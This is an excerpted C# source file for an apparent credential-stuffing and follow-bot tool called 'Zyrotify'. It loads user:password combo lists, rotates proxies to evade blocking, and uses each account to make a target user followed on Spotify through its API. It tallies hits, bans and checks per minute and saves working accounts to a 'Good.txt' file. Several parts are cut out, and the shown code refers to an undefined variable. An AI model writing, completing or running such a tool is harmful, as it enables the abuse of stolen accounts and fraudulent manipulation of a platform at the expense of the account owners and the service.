...
namespace god_checker
{
    internal class CheckerHelper2
    {
        ...
        public static void UpdateTitle()
        {
            for (; ; )
            {
                CheckerHelper2.CPM = CheckerHelper2.CPM_aux;
                CheckerHelper2.CPM_aux = 0;
                Console.Title = string.Format("Zyrotify | Module: User Follower | Checked {0} - Remaining {1} | Hits {2} - Fails {4} - CPM ", new object[]
                {
                        CheckerHelper2.check,
                        CheckerHelper2.total,
                        CheckerHelper2.hits,
                        CheckerHelper2.free,
                        CheckerHelper2.bad,
                        CheckerHelper2.err,
                }) + CheckerHelper2.CPM * 60;
                Console.Clear();
                ...
                Console.Write("] CPM : ");
                Console.ForegroundColor = ConsoleColor.Cyan;
                Console.Write(CheckerHelper2.CPM * 60);
                Console.WriteLine("");
                ...
                Console.Write("] Error : ");
                Console.ForegroundColor = ConsoleColor.DarkYellow;
                Console.Write(CheckerHelper2.err);
                Console.WriteLine("");
                ...
                Console.ForegroundColor = ConsoleColor.DarkMagenta;
                Console.Write(CheckerHelper2.check); Console.Write(" / "); Console.Write(CheckerHelper2.total);
                Console.WriteLine("");
                ...
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine(CheckerHelper2.hits);
                ...
                Console.Write("] BAN : ");
                Console.ForegroundColor = ConsoleColor.DarkRed;
                Console.WriteLine(CheckerHelper2.free);
                ...
                Console.Write("] BADS : ");
                Console.ForegroundColor = ConsoleColor.DarkRed;
                Console.WriteLine(CheckerHelper2.bad);
        ...
        public static void Check()
        {
            for (; ; )
            {
                if (CheckerHelper2.proxyindex > CheckerHelper2.proxies.Count<string>() - 2)
                {
                    CheckerHelper2.proxyindex = 0;
                }
                try
                {
                    Interlocked.Increment(ref CheckerHelper2.proxyindex);
                    using (HttpRequest req = new HttpRequest())
                    {
                        if (CheckerHelper2.accindex >= CheckerHelper2.accounts.Count<string>())
                        {
                            CheckerHelper2.stop++;
                            break;
                        }
                        Interlocked.Increment(ref CheckerHelper2.accindex);
                        string[] array = CheckerHelper2.accounts[CheckerHelper2.accindex].Split(new char[]
                        {
                            ':',
                            ';',
                            '|'
                        ...
                        try
                        {
                            if (CheckerHelper2.proxytype == "HTTP")
                            {
                                req.Proxy = HttpProxyClient.Parse(CheckerHelper2.proxies[CheckerHelper2.proxyindex]);
                                req.Proxy.ConnectTimeout = 5000;
                            }
                            if (CheckerHelper2.proxytype == "SOCKS4")
                            {
                                req.Proxy = Socks4ProxyClient.Parse(CheckerHelper2.proxies[CheckerHelper2.proxyindex]);
                                req.Proxy.ConnectTimeout = 5000;
                            }
                            if (CheckerHelper2.proxytype == "SOCKS5")
                            {
                                req.Proxy = Socks5ProxyClient.Parse(CheckerHelper2.proxies[CheckerHelper2.proxyindex]);
                                req.Proxy.ConnectTimeout = 5000;
                            }
                            if (CheckerHelper2.proxytype == "PROXYLESS")
                            {
                                req.Proxy = null;
                            }
                            if (CheckerHelper2.check >= CheckerHelper2.total)
                            {
                                break;
                            }
                            ...
                            req.Put("https://api.spotify.com/v1/me/following?type=user&ids=" + Program.alqwe2 ).ToString();

                            if (giris.Contains("{\"result\":\"ok\",\""))
                            {

                                CheckerHelper2.CPM_aux++;
                                CheckerHelper2.check++;
                                CheckerHelper2.hits++;
                                CheckerHelper2.Good2("Account: " + text);
                            }
                            ...
                            {
                                CheckerHelper2.accounts.Add(text);
                            }
                        }
                        catch (Exception)
                        {
                ...
                {
                    Interlocked.Increment(ref CheckerHelper2.err);
                }
            }
        }
        ...
        public static void Good2(string account)
        {
            try
            {
                using (StreamWriter sw = File.AppendText("results/mailaccess31/Good.txt"))
                {
        ...
        public static void Bad2(string account)
        {
            try
            {
                using (StreamWriter sw = File.AppendText("results/mailaccess31/Bad.txt"))
                {
                    sw.WriteLine(account);
                }
            }
